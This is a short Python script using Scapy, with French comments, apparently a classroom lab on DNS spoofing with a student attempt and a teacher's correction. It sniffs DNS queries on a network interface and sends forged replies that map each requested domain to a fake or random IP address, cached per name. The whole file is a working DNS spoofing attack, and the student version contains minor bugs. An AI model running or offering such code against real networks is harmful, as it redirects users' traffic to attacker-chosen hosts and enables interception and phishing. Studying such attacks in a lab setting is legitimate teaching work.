from scapy.all import *
from pdb import pm


# Dictionnaire pour stocker le cache des réponses DNS
# dns -> IP
cache = {}

def dns_menteur(packet):
    if DNSQR in packet and DNSRR not in packet and IP in packet and packet[IP].version == 4:
        # nom de domaine de la requête DNS
        query_name = packet[DNSQR].qname.decode("utf-8")

        # IP = 10.0.0.1 ? 
        if packet[IP].dst == "10.0.0.1":
            if query_name in cache:
                # Nom de domaine est dans le cache, renvoyer l'IP associée
                spoofed_ip = cache[query_name]
                print(f"Cache hit! Spoofing {query_name} to {spoofed_ip}")
            else:
                # Pas dans le cache -> IP spoofed
                spoofed_ip = "192.168.1.100"
                cache[query_name] = spoofed_ip
                print(f"No cache! Spoofing {query_name} to {spoofed_ip}")

            # Réponse DNS
            dns_response = IP(dst=packet[IP].src, src=packet[IP].dst) / UDP(dport=packet[UDP].sport, sport=packet[UDP].sport) / DNS(
                id=packet[DNS].id,
                qr=1,
                aa=1,
                an=DNSRR(rrname="perdu.com",rdata=spoofed_ip),
                qd=DNSQR(qname=packet[DNSQR].qname.decode("utf-8"))
            )

            send(dns_response, verbose=False)

# code prof - correction
def callback(pkt):
    print("toto")
    global cache
    if DNSQR not in pkt:
        return
    query = pkt[DNSQR]
    #Check if it's a A request
    if query.qtype != 1:
        return
    # Cache handling
    target_dom = query.qname
    reply_ip = cache.setdefault(target_dom, str(RandIP()))

    pkt_reply = IP(dst=pkt[IP].src, src=pkt[IP].dst) / UDP (
        dport = pkt[UDP].sport, sport = pkt[UDP].dport
    ) / DNS (
        id=pkt[DNS].id,
        qr=1, # on dit que y'a au moins une réponse
        qd=pkt[DNSQR],
        an=DNSRR(
            rrname=target_dom,
            type="A",
            rdata=reply_ip
        )
    )
    send(pkt_reply)

# Sniff des requêtes DNS IPv4
sniff(filter="udp port 53 and ip dst 10.0.0.1", prn=callback, store=0, iface=["eno1"])
